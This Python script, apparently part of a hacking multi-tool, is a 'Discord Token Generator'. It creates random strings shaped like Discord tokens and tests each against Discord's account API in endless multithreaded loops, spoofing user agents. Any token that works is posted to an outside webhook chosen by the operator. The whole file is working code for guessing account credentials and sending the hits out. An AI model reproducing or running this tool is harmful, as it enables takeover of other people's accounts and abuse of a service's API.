# Copyright (c) 2026 v4lkyr0
# See LICENSE file for details

from Plugins.Utils import *
from Plugins.Config import *

try:
    import json
    import random
    import requests
    import string
    import threading
except Exception as e:
    MissingModule(e)

Title("Discord Token Generator")
Connection()

try:
    webhook = ChoiceWebhook()

    try:
        threads_number = int(input(f"{INPUT} Threads Number {red}->{reset} ").strip())
    except:
        ErrorNumber()

    print(f"{LOADING} Generating Tokens..", reset)

    def SendWebhook(embed_content):
        payload = {
            'embeds': [embed_content],
            'username': username_webhook,
            'avatar_url': avatar_webhook
        }
        requests.post(webhook, data=json.dumps(payload), headers={'Content-Type': 'application/json', 'User-Agent': RandomUserAgents()})

    def TokenCheck():
        TOKEN_CHARS = string.ascii_letters + string.digits + '-_'
        first_part  = ''.join(random.choice(TOKEN_CHARS) for _ in range(random.choice([24, 26])))
        second_part = ''.join(random.choice(TOKEN_CHARS) for _ in range(6))
        third_part  = ''.join(random.choice(TOKEN_CHARS) for _ in range(38))
        token       = f"{first_part}.{second_part}.{third_part}"

        try:
            response = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': token, 'User-Agent': RandomUserAgents()})
            if response.status_code == 200:
                embed_content = {
                    "title": "Token found!",
                    "description": f"**Token:**\n```{token}```",
                    "color": color_embed,
                    "footer": {"text": username_webhook, "icon_url": avatar_webhook}
                }
                SendWebhook(embed_content)
                print(f"{SUCCESS} Status:{red} Valid   {white}| Token:{red} {token}", reset)
            else:
                print(f"{ERROR} Status:{red} Invalid {white}| Token:{red} {token}", reset)
        except:
            print(f"{ERROR} Status:{red} Error   {white}| Token:{red} {token}", reset)

    def Request():
        threads = []
        try:
            for _ in range(threads_number):
                t = threading.Thread(target=TokenCheck)
                t.start()
                threads.append(t)
        except:
            ErrorNumber()
        for thread in threads:
            thread.join()

    while True:
        Request()

except Exception as e:
    Error(e)